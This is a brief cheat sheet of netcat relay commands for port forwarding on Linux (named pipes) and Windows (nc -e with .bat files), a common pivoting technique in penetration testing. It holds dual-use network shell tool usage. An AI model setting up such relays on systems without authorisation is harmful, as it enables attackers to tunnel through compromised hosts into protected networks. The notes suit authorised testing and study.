# Port forwarding Linux (nc relays)

- Create named pipe
    cd /tmp && mknod [name] p

- Listener to Client
    nc -nvlp [local port] 0<[named pipe] | nc [target IP] [port] | tee [named pipe]
        Sends packets from [local port] to a nc client connected to [target IP] on [port]

- Listener to Listener
    nc -nvlp [local port 1] 0<[named pipe] | nc -nvlp [local port 2] | tee [named pipe]
        Sends packets from any connection on [local port 1] to any connection on [local port 2]

- Client to Client
    nc [previous hop] [port 1] 0<[named pipe] | nc [next hop] [port 2] | tee [named pipe]
        Sends packets from connection to [previous hop] on [port 1] to [next hop] on [port 2]
        
# Port forwarding Windows

- Enter temporary directory to create .bat files
    cd C:\temp

- Listener to Client
    echo nc [target IP] [port] > relay.bat
    nc -lp [local port] -e relay.bat
        Sends packets from [local port] to a nc client connected to [target IP] on [port]

- Listener to Listener
    echo nc -lp [local port 2] > relay.bat
    nc -lp [local port 1] -e relay.bat
        Sends packets from any connection on [local port 1] to any connection on [local port 2]

- Client to Client
    echo nc [next hop] [port 2] > relay.bat
    nc [previous hop] [port 1] -e relay.bat
        Sends packets from connection to [previous hop] on [port 1] to [next hop] on [port 2]
